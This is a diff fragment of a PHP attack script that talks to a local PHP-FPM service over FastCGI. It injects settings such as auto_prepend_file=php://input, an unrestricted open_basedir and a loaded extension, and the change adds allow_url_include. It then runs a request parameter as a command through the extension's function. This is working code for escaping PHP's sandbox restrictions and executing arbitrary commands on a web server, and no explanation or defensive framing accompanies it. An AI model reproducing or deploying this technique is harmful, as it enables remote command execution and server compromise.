@@ -318,7 +318,7 @@ if (isset($_REQUEST['cmd'])) {
     $client = new FCGIClient("127.0.0.1:9000", -1);
     //$client = new FCGIClient("unix:///var/run/php/php-fpm.sock", -1);
     $code = "<?php echo '\$\$';hello_world(\$_REQUEST['command']);?>";
-    $php_value = "open_basedir = /\nauto_prepend_file = php://input";
+    $php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
     $php_admin_value = "extension_dir=" . $ext_dir_path . "\nextension=" . $ext_name;
     $params = array(
         'GATEWAY_INTERFACE' => 'FastCGI/1.0',
